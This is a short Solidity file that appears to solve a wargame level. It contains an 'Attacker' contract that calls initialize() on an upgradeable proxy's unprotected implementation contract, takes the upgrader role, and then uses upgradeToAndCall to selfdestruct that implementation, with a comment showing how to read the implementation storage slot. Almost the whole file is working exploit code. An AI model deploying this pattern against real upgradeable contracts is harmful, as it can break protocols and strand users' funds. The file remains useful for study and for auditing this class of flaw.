// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

// To know your engine address.
// await web3.eth.getStorageAt(contract.address,"0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc")


interface IEngine {
    function initialize() external;
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable;
}

contract Attacker {
    function pwn(IEngine target) external {
        // Calling initialize on the target to become the upgrader.
        target.initialize();
        
        // Upgrade implementation to this contract and call kill().
        target.upgradeToAndCall(address(this), abi.encodeWithSelector(this.kill.selector));
    }

    function kill() external {
        // Selfdestruct called to remove the contract's code and send balance to zero address
        // NOTE: Due to EVM update (Cancun hard fork), selfdestruct no longer deletes the contract bytecode,
        // it only transfers the ETH balance. So the code remains on-chain.
        // You can verify on Etherscan if the selfdestruct succeeded by checking internal transactions,
        // but the bytecode will still be visible.
        selfdestruct(payable(address(0)));
    }
}

